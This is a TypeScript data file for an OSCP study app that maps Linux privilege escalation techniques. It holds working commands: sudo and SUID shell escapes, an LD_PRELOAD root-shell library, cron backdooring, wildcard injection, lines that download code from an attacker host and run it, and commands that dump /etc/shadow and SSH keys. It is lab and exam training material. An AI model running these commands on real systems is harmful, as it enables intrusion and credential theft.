import type { OscpContent } from '@/types/oscp'

/** Phase: Linux privilege escalation. */
const linuxPrivesc: OscpContent = {
    nodes: [
        {
            id: 'privesc-enum-linux',
            title: 'Enumerate for privesc (Linux)',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Run the quick manual checks, then linpeas. The usual wins: sudo -l, SUID binaries, writable cron, capabilities, kernel version, and creds lying in files.',
            commands: [
                {
                    label: 'First things to run',
                    code: `id; sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
uname -a; cat /etc/os-release`,
                },
                {
                    label: 'linpeas',
                    code: 'wget http://<kali-ip>/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh',
                },
                {
                    label: 'pspy + writable paths',
                    code: `pspy64 -pf -i 1000
find / -writable -type d 2>/dev/null | grep -vE 'proc|sys|run'
ls -la /opt /var/www /home`,
                },
                {
                    label: 'Kernel + pkg versions',
                    code: `uname -a; cat /proc/version
dpkg -l 2>/dev/null | awk '{print $2,$3}'
rpm -qa 2>/dev/null`,
                },
            ],
            tags: ['linpeas', 'enumeration', 'sudo', 'suid'],
        },
        {
            id: 'sudo-abuse',
            title: 'Sudo misconfiguration',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                '`sudo -l` shows a command you may run as root. Look it up on GTFOBins for a shell escape. NOPASSWD entries and sudo env tricks (LD_PRELOAD) are common.',
            commands: [
                {
                    label: 'Exploit a sudo entry',
                    code: `sudo -l
# example GTFOBins escapes:
sudo find . -exec /bin/sh \\; -quit
sudo vim -c ':!/bin/sh'`,
                },
                {
                    label: 'LD_PRELOAD / env_keep',
                    code: `sudo -l   # look for env_keep += LD_PRELOAD / LD_LIBRARY_PATH
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(){unsetenv("LD_PRELOAD");setresuid(0,0,0);system("/bin/sh");}
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <allowed-binary>`,
                },
                {
                    label: 'sudo git pager',
                    code: `sudo PAGER='sh -c "exec sh 0<&1"' git -p help
# GTFOBins: sudo -u root <bin>  then look up the binary`,
                },
            ],
            references: [{ label: 'GTFOBins', url: 'https://gtfobins.github.io/' }],
            tags: ['sudo', 'gtfobins', 'nopasswd'],
        },
        {
            id: 'suid-sgid',
            title: 'SUID / SGID binary',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A binary runs as its owner (root). Custom SUID binaries often call other programs by relative path (PATH hijack) or via system(). Standard ones map to GTFOBins - e.g. a SUID wget can overwrite /etc/passwd with a root entry.',
            commands: [
                {
                    label: 'Find + exploit',
                    code: `find / -perm -4000 -type f 2>/dev/null
# GTFOBins example:
install -m 4755 /bin/bash /tmp/bash 2>/dev/null; /tmp/bash -p`,
                },
                {
                    label: 'PATH hijack on custom SUID',
                    code: `strings <suid-bin> | head
# if it calls \`service\` / \`find\` without a full path:
echo '/bin/sh' > /tmp/service; chmod +x /tmp/service
PATH=/tmp:$PATH /usr/local/bin/<suid-bin>`,
                },
                {
                    label: 'Shared-object hijack',
                    code: `ldd <suid-bin>
strace -f -e open,openat <suid-bin> 2>&1 | grep -i 'no such'
# plant a .so in a writable missing path, then rerun`,
                },
            ],
            references: [{ label: 'GTFOBins (SUID)', url: 'https://gtfobins.github.io/#+suid' }],
            tags: ['suid', 'sgid', 'gtfobins'],
        },
        {
            id: 'cron-abuse',
            title: 'Writable cron / script',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A root cron runs a script you can write (or a wildcard you can inject). Append a reverse shell or SUID drop and wait for the next tick.',
            commands: [
                {
                    label: 'Backdoor a writable root script',
                    code: "echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/writable.sh",
                },
                {
                    label: 'Watch with pspy',
                    code: `pspy64 -pf -i 1000
cat /etc/crontab /etc/cron.*/* /var/spool/cron/crontabs/* 2>/dev/null
ls -la /etc/cron.* /var/spool/cron`,
                },
                {
                    label: 'Wildcard injection',
                    code: `# root cron: tar czf /tmp/b.tgz *
touch /tmp/--checkpoint=1
touch /tmp/--checkpoint-action=exec=sh\\ payload.sh`,
                },
            ],
            tags: ['cron', 'timer', 'wildcard', 'pspy'],
        },
        {
            id: 'linux-capabilities',
            title: 'Dangerous capability',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A binary carries a capability (cap_setuid, cap_dac_read_search). These grant root-equivalent power without SUID.',
            commands: [
                {
                    label: 'Find + abuse',
                    code: `getcap -r / 2>/dev/null
# python with cap_setuid:
./python -c 'import os;os.setuid(0);os.system("/bin/sh")'`,
                },
                {
                    label: 'cap_dac_read_search / cap_dac_override',
                    code: `getcap -r / 2>/dev/null
# tar with cap_dac_read_search can read /etc/shadow:
./tar -cf /tmp/s.tar /etc/shadow && tar -xf /tmp/s.tar`,
                },
            ],
            tags: ['capabilities', 'getcap', 'cap_setuid'],
        },
        {
            id: 'nfs-no-root-squash',
            title: 'NFS no_root_squash',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'An export with no_root_squash lets you write files as root from your box. Mount it, drop a root-owned SUID binary, execute it on the target.',
            commands: [
                {
                    label: 'Mount + plant SUID',
                    code: `showmount -e <target>
sudo mount -t nfs <target>:/export /mnt
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash   # as root on Kali
# on target: /export/rootbash -p`,
                },
                {
                    label: 'Confirm export options',
                    code: `showmount -e <target>
cat /etc/exports
nmap -p2049 --script nfs-showmount,nfs-ls <target>`,
                },
            ],
            tags: ['nfs', 'no_root_squash', 'mount'],
        },
        {
            id: 'kernel-exploit-linux',
            title: 'Kernel exploit',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Last resort - match the kernel version to a public exploit (CVE-2022-0847 DirtyPipe, CVE-2021-4034 PwnKit/pkexec, DirtyCow). Reboots can break the box; note it in the report.',
            commands: [
                {
                    label: 'Version match',
                    code: `uname -a
searchsploit linux kernel <version>`,
                },
                {
                    label: 'PwnKit / DirtyPipe',
                    code: `pkexec --version     # CVE-2021-4034 if PolKit < 0.120
# DirtyPipe: kernel 5.8-5.16.11 (CVE-2022-0847)
searchsploit pwnkit dirtypipe dirtycow`,
                },
                {
                    label: 'Compile on Kali, run on target',
                    code: `gcc exploit.c -o exploit -static
chmod +x exploit && ./exploit
# transfer first: wget http://<kali-ip>/exploit -O /tmp/exploit`,
                },
            ],
            tags: ['kernel', 'dirtypipe', 'pwnkit', 'dirtycow'],
        },
        {
            id: 'cred-hunt-linux',
            title: 'Credential hunting',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Search configs, history, mail, and home dirs for passwords and SSH keys. Reused creds often escalate you or open the next host.',
            commands: [
                {
                    label: 'Hunt',
                    code: `grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
find / -name id_rsa 2>/dev/null; cat ~/.bash_history`,
                },
                {
                    label: 'History / mail / SSH',
                    code: `cat ~/.bash_history ~/.mysql_history ~/.nano_history 2>/dev/null
ls -la /var/mail /var/spool/mail
find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.pem' 2>/dev/null
env | grep -iE 'pass|key|token'`,
                },
            ],
            tags: ['credentials', 'ssh-key', 'config', 'hunting'],
        },
        {
            id: 'root-linux',
            title: 'root on Linux',
            type: 'state',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Box owned. Grab the root flag, then loot: /etc/shadow, SSH keys, and app configs. On a domain-joined host, harvested creds feed lateral movement.',
            commands: [
                {
                    label: 'Loot',
                    code: 'cat /etc/shadow; cp /root/.ssh/id_rsa .; find / -name "*.kdbx" 2>/dev/null',
                },
                {
                    label: 'Proof + extra loot',
                    code: `id; hostname; cat /root/root.txt
cat /root/.ssh/id_rsa /root/.bash_history
grep -rniE 'password|secret' /root /opt /etc 2>/dev/null | head`,
                },
            ],
            tags: ['root', 'owned', 'loot', 'shadow'],
        },
        {
            id: 'lxd-docker-group',
            title: 'lxd / docker group membership',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Membership of the lxd or docker group is root-equivalent: mount the host filesystem inside a privileged container and read /mnt/root for the flag, or add a root user to /etc/passwd.',
            commands: [
                {
                    label: 'lxd -> mount host root',
                    code: `# build a minimal alpine image, then:
lxc init alpine p -c security.privileged=true
lxc config device add p host root disk source=/ path=/mnt/root recursive=true
lxc start p && lxc exec p -- /bin/sh
# read /mnt/root/root/root.txt, or chroot and add a user`,
                },
                {
                    label: 'docker -> host root',
                    code: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
                },
                {
                    label: 'Confirm group',
                    code: `id; grep -E 'docker|lxd' /etc/group
docker images; docker ps -a
lxc list`,
                },
            ],
            tags: ['lxd', 'lxc', 'docker', 'container', 'group'],
        },
    ],
    edges: [
        { from: 'privesc-enum-linux', to: 'sudo-abuse', label: 'sudo -l has entries' },
        { from: 'privesc-enum-linux', to: 'suid-sgid', label: 'unusual SUID binary' },
        { from: 'privesc-enum-linux', to: 'cron-abuse', label: 'writable root cron' },
        { from: 'privesc-enum-linux', to: 'linux-capabilities', label: 'capability set' },
        { from: 'privesc-enum-linux', to: 'kernel-exploit-linux', label: 'old kernel, nothing else' },
        { from: 'privesc-enum-linux', to: 'cred-hunt-linux', label: 'look for creds/keys' },
        { from: 'sudo-abuse', to: 'root-linux', label: 'root shell' },
        { from: 'suid-sgid', to: 'root-linux', label: 'root shell' },
        { from: 'cron-abuse', to: 'root-linux', label: 'cron fires' },
        { from: 'linux-capabilities', to: 'root-linux', label: 'setuid(0)' },
        { from: 'nfs-no-root-squash', to: 'root-linux', label: 'SUID drop runs' },
        { from: 'kernel-exploit-linux', to: 'root-linux', label: 'exploit lands' },
        { from: 'cred-hunt-linux', to: 'creds-found', label: 'creds/keys recovered' },
        { from: 'root-linux', to: 'creds-found', label: 'dump shadow / keys' },
        { from: 'root-linux', to: 'ad-foothold', label: 'domain-joined host' },
        { from: 'privesc-enum-linux', to: 'lxd-docker-group', label: 'lxd/docker group present' },
        { from: 'lxd-docker-group', to: 'root-linux', label: 'mount host / or write root' },
    ],
}

export default linuxPrivesc
